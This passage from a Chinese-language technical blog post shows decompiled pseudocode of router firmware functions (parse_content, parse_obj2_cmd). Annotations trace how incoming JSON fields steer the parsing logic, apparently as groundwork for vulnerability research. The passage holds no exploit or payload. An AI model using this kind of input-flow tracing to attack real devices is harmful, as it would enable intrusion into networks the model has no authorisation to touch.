class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">4</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  v3 = json_tokener_parse();                    <span class="comment">// 解析json数据</span></span><br><span class="line">  json = v3;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">605</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)para invalid!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(v3, <span class="string">&quot;params&quot;</span>, &amp;params) != <span class="number">1</span> )<span class="comment">// 提取param数据</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;device&quot;</span>, &amp;device) == <span class="number">1</span> &amp;&amp; json_object_get_type(device) == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = (<span class="type">const</span> <span class="type">char</span> *)json_object_get_string(device);</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)caller:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">621</span>, <span class="built_in">string</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;method) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_31:</span><br><span class="line">    json_object_put(json);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string = json_object_get_string(method);</span><br><span class="line">  <span class="keyword">if</span> ( !method_string )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)Get method failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;cmdArr&quot;</span>) )        <span class="comment">// 如果method包含cmdArr，显然不包含</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = params;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">56</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(v8, <span class="string">&quot;params&quot;</span>, &amp;v16) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v10 = json_object_array_length(v16);</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = v10;</span><br><span class="line">    <span class="keyword">while</span> ( v9 &lt; v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      idx = json_object_array_get_idx(v16, v9);</span><br><span class="line">      <span class="keyword">if</span> ( idx )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">654</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = parse_obj2_cmd(idx, <span class="built_in">string</span>);</span><br><span class="line">        *v12 = v13;</span><br><span class="line">        <span class="keyword">if</span> ( !v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">659</span>);</span><br><span class="line">          json_object_put(json);</span><br><span class="line">          free_cmd(v12);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pkg_add_cmd(a1, v12);</span><br><span class="line">        v12[<span class="number">2</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v9;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">52</span>) = <span class="number">1</span>;</span><br><span class="line">    v14 = (<span class="type">int</span> *)malloc_cmd();</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = parse_obj2_cmd(json, <span class="built_in">string</span>);</span><br><span class="line">    *v14 = addr;</span><br><span class="line">    <span class="keyword">if</span> ( !addr )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)cmd paras failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_content&quot;</span>, <span class="number">679</span>);</span><br><span class="line">      free_cmd(v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    pkg_add_cmd(a1, v14);</span><br><span class="line">    v14[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  json_object_put(json);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算是初步解析json数据，然后调用parse_obj2_cmd函数</p>
<h4 id="parse-obj2-cmd"><a href="#parse-obj2-cmd" class="headerlink" title="parse_obj2_cmd"></a>parse_obj2_cmd</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_obj2_cmd</span><span class="params">(<span class="type">int</span> json, <span class="type">int</span> string_0)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> ptr_2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> method_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// dc</span></span><br><span class="line">  _BYTE *v25; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v27; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v28; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v29; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v30; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v31; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v32; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v33; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v34; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v39; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v40; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> params_module; <span class="comment">// [sp+20h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+24h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  ptr_2 = ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory is full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">276</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  <span class="keyword">if</span> ( string_0 )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">16</span>) = strdup(string_0);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;module&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">    || (method_1 = json_object_get_string(params_module), (method_2 = method_1) == <span class="number">0</span>)</span><br><span class="line">    || <span class="built_in">strcmp</span>(method_1, <span class="string">&quot;esw&quot;</span>) )                <span class="comment">// 显然进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    method_string = json_object_get_string(params_module);</span><br><span class="line">    v16 = method_string;</span><br><span class="line">    <span class="keyword">if</span> ( !method_string )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)s_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">2</span>;                                  <span class="comment">// 成立</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v16, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, (<span class="type">const</span> <span class="type">char</span> *)dword_41FA70, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">LABEL_46:</span><br><span class="line">          v18 = <span class="built_in">strchr</span>(v16, <span class="number">46</span>);</span><br><span class="line">          v19 = strdup(v18 + <span class="number">1</span>);</span><br><span class="line">          *(_DWORD *)(ptr_2 + <span class="number">4</span>) = v19;</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">          <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;params&quot;</span>, &amp;params) == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;module&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">string</span> = json_object_get_string(params_module);</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v21 = strdup(<span class="built_in">string</span>);</span><br><span class="line">                *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v21;</span><br><span class="line">                <span class="keyword">if</span> ( v21 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;remoteIp&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">                    || (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v22 = json_object_get_string(params_module);</span><br><span class="line">                  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  v23 = strdup(v22);</span><br><span class="line">                  *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v23;</span><br><span class="line">                  <span class="keyword">if</span> ( v23 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)params is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_129:</span><br><span class="line">          cmd_msg_free(ptr_2);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)ptr_2 = v17;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  &#125;                                             <span class="comment">// end</span></span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_2);</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;module:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">295</span>, v8);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;url&quot;</span>, &amp;params_module) == <span class="number">1</span> )<span class="comment">// 无</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = strdup(v9);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">28</span>) = v10;</span><br><span class="line">      <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)cmd_msg-&gt;url_str:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">306</span>,</span><br><span class="line">        *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">28</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;sn&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = strdup(v11);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">32</span>) = v12;</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;sn:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">318</span>, *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">32</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;ip&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string_1 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( method_string_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_string_1);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span 